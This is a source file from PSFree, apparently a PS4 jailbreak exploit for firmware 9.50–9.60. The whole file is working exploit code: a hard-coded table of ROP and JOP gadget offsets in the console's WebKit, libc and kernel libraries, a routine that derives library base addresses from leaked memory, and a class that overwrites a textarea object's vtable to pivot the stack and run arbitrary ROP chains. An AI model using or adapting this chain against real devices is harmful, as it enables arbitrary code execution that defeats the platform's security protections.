/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// 9.50, 9.51, 9.60
// ROP Chain by @janisslsm

import { mem } from "../../module/mem.mjs";
import { KB } from "../../module/offset.mjs";
import { ChainBase } from "../../module/chain.mjs";
import { BufferView } from "../../module/rw.mjs";

import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";

import * as off from "../../module/offset.mjs";

// WebKit offsets of imported functions
const offset_wk_stack_chk_fail = 0x178;
const offset_wk_strlen = 0x198;

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// gadgets for the JOP chain
//
// When the scrollLeft getter native function is called on the console, rsi is
// the JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
//
// jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by jop1.
//
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
cmc
jmp qword ptr [rax + 0x7c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be
// ignored
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = "pop rsp; ret";

// the ps4 firmware is compiled to use rbp as a frame pointer
//
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp

const webkit_gadget_offsets = new Map(
  Object.entries({
    "pop rax; ret": 0x0000000000011c46, // `58 c3`
    "pop rbx; ret": 0x0000000000013730, // `5b c3`
    "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
    "pop rdx; ret": 0x000000000018de52, // `5a c3`

    "pop rbp; ret": 0x00000000000000b6, // `5d c3`
    "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
    "pop rdi; ret": 0x000000000005d19d, // `5f c3`
    "pop rsp; ret": 0x00000000000253e0, // `5c c3`

    "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
    "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
    // Not found in 9.50-9.60, but not currently used in exploit
    // "pop r10; ret" : 0x0000000000000000, // `4(1,3,5,7,9,b,d,f) 5a c3`
    "pop r11; ret": 0x0000000001833a21, // `47 5b c3`

    "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
    "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
    "pop r14; ret": 0x000000000028c900, // `41 5e c3`
    "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`

    "ret": 0x0000000000000032, // `c3`
    "leave; ret": 0x0000000000056322, // `c9 c3`

    "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
    "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
    "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
    "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`

    [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
    [jop2]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
    [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`

    [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
    [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
    [jop6]: 0x00000000002b7a9c, // `52 ff 20`
    [jop7]: 0x00000000000253e0, // `5c c3`
  }),
);

const libc_gadget_offsets = new Map(
  Object.entries({
    "getcontext": 0x21284,
    "setcontext": 0x254dc,
  }),
);

const libkernel_gadget_offsets = new Map(
  Object.entries({
    // returns the location of errno
    "__error": 0xbb60,
  }),
);

export const gadgets = new Map();

function get_bases() {
  const textarea = document.createElement("textarea");
  const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
  const textarea_vtable = webcore_textarea.readp(0);
  const off_ta_vt = 0x2ebea68;
  const libwebkit_base = textarea_vtable.sub(off_ta_vt);

  const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
  const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
  const off_scf = 0x28870;
  const libkernel_base = stack_chk_fail_addr.sub(off_scf);

  const strlen_import = libwebkit_base.add(offset_wk_strlen);
  const strlen_addr = resolve_import(strlen_import);
  const off_strlen = 0x4c040;
  const libc_base = strlen_addr.sub(off_strlen);

  return [libwebkit_base, libkernel_base, libc_base];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
  for (const [insn, offset] of offset_map) {
    gadget_map.set(insn, base_addr.add(offset));
  }
}

class Chain950Base extends ChainBase {
  push_end() {
    this.push_gadget("leave; ret");
  }

  push_get_retval() {
    this.push_gadget("pop rdi; ret");
    this.push_value(this.retval_addr);
    this.push_gadget("mov qword ptr [rdi], rax; ret");
  }

  push_get_errno() {
    this.push_gadget("pop rdi; ret");
    this.push_value(this.errno_addr);

    this.push_call(this.get_gadget("__error"));

    this.push_gadget("mov rax, qword ptr [rax]; ret");
    this.push_gadget("mov dword ptr [rdi], eax; ret");
  }

  push_clear_errno() {
    this.push_call(this.get_gadget("__error"));
    this.push_gadget("pop rsi; ret");
    this.push_value(0);
    this.push_gadget("mov dword ptr [rax], esi; ret");
  }
}

export class Chain950 extends Chain950Base {
  constructor() {
    super();

    const textarea = document.createElement("textarea");
    this._textarea = textarea;
    const js_ta = mem.addrof(textarea);
    const webcore_ta = js_ta.readp(0x18);
    this._webcore_ta = webcore_ta;
    // Only offset 0x1c8 will be used when calling the scrollLeft getter
    // native function (our tests don't crash).
    //
    // This implies we don't need to know the exact size of the vtable and
    // try to copy it as much as possible to avoid a crash due to missing
    // vtable entries.
    //
    // So the rest of the vtable are free for our use.
    const vtable = new BufferView(0x200);
    const old_vtable_p = webcore_ta.readp(0);
    this._vtable = vtable;
    this._old_vtable_p = old_vtable_p;

    // 0x1b8 is the offset of the scrollLeft getter native function
    vtable.write64(0x1b8, this.get_gadget(jop1));
    vtable.write64(0xb8, this.get_gadget(jop2));
    vtable.write64(0x7c, this.get_gadget(jop3));

    // for the JOP chain
    const rax_ptrs = new BufferView(0x100);
    const rax_ptrs_p = get_view_vector(rax_ptrs);

    rax_ptrs.write64(0x30, this.get_gadget(jop4));
    rax_ptrs.write64(0x58, this.get_gadget(jop5));
    rax_ptrs.write64(0x10, this.get_gadget(jop6));
    rax_ptrs.write64(0, this.get_gadget(jop7));
    // value to pivot rsp to
    rax_ptrs.write64(0x18, this.stack_addr);

    const jop_buffer = new BufferView(8);
    const jop_buffer_p = get_view_vector(jop_buffer);

    jop_buffer.write64(0, rax_ptrs_p);

    vtable.write64(8, jop_buffer_p);
  }

  run() {
    this.check_allow_run();
    this._webcore_ta.write64(0, get_view_vector(this._vtable));
    this._textarea.scrollLeft;
    this._webcore_ta.write64(0, this._old_vtable_p);
    this.dirty();
  }
}

export const Chain = Chain950;

export function init(Chain) {
  const syscall_array = [];
  [libwebkit_base, libkernel_base, libc_base] = get_bases();

  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
  init_syscall_array(syscall_array, libkernel_base, 300 * KB);

  Chain.init_class(gadgets, syscall_array);
}
